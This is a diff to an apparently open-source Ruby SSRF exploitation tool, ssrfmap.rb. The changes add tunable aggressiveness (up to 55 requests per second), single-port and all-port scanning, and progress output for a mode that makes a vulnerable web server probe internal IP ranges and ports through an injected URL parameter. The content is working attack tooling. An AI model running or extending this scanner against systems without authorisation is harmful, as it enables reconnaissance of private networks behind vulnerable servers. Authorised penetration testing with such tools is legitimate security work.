@@ -5,9 +5,20 @@ require 'netaddr'  # Dependency
 require 'uri'
 require 'optparse'
 require 'base64'
-require_relative './lib/ports.rb'
+require_relative './resources/ports.rb'
+require_relative './resources/ports-all.rb'
 
 options = {}
+
+# Default values
+options[:agv_level] = "3"
+options[:ports] = $ports
+
+# Requests counter
+$global_request_counter = 0
+
+# Clean SIGINT output
+trap("SIGINT") { puts "\nBye!"; exit! }
 
 OptionParser.new do |opts|
   opts.banner = "Usage example: ssrfmap.rb -u http://www.example.com/func.php?url=_SSRF_\nSee -h for help."
@@ -41,7 +52,19 @@ OptionParser.new do |opts|
     options[:length] = d
   end
 
-  opts.on("--base64", "Encode payload in base64") do |d|
+  opts.on("-T LEVEL", "[Optional] Aggressivity level [1,2,3,4,5], more aggressive means more requests per second. Default: 3)") do |d|
+    options[:agv_level] = d
+  end
+
+  opts.on("-p PORT", "[Optional] Scans for one port") do |d|
+    options[:ports] = "#{d},"
+  end
+
+  opts.on("-all", "[Optional] Scan all ports (only in scan mode)") do |d|
+    options[:ports] = $portsall
+  end
+
+  opts.on("--base64", "[Optional] Encode payload in base64") do |d|
     options[:base64] = true
   end
 
@@ -51,6 +74,18 @@ OptionParser.new do |opts|
   end
 
 end.parse!
+
+# Clunky
+$options = options
+
+# Aggresivity level map: level => requests per second
+$aggresivity = {
+  "1" => 1,
+  "2" => 5,
+  "3" => 15,
+  "4" => 35,
+  "5" => 55
+}
 
 if !options[:url]
 	puts options[:banner]
@@ -70,7 +105,7 @@ end
 # final_uri => Defines target uri
 # mode => Defines if script is running on "exploit" mode or just "scan" mode
 #
-$options = options
+
 def get_result(final_uri,http_method,body,mode,ssrf_uri,regex)
 
 	if body && body[0] == "{" then # Its JSON
@@ -88,7 +123,11 @@ def get_result(final_uri,http_method,body,mode,ssrf_uri,regex)
 	)
 
 	request.on_complete do |response|
-    
+
+    $global_request_counter += 1
+    STDOUT.flush
+    print "[...] Completed requests: #{$global_request_counter.to_s}/#{$options[:ports].split(',').length.to_s}\r"
+
     if $options[:base64] then
       ssrf_uri = Base64.decode64 ssrf_uri
     end
@@ -172,11 +211,11 @@ target_range = NetAddr::CIDR.create(target_range)
 puts "Running on scan mode:\nTarget: #{target_range}\nProtocol: #{target_prt}"
 
 for i in 0..target_range.size-1 do
-	hydra = Typhoeus::Hydra.new(max_concurrency: 10)
+	hydra = Typhoeus::Hydra.new(max_concurrency: $aggresivity[$options[:agv_level]].to_i)
 
 	target_host = target_range[i]
 
-	$ports.split(',').each do |target_port|
+	options[:ports].split(',').each do |target_port|
 		ssrf_uri = "#{target_prt}://#{target_host.to_s.split('/')[0]}:#{target_port}"
     if options[:base64] then
       ssrf_uri = Base64.encode64 ssrf_uri
@@ -189,5 +228,6 @@ for i in 0..target_range.size-1 do
 		hydra.queue get_result(injected_uri || uri,http_method,injected_post_data || post_data,"scan",ssrf_uri,regex)
 	end
 
+  puts "[*] Queueing requests for #{target_host.to_s.split('/')[0]}..."
 	hydra.run
 end
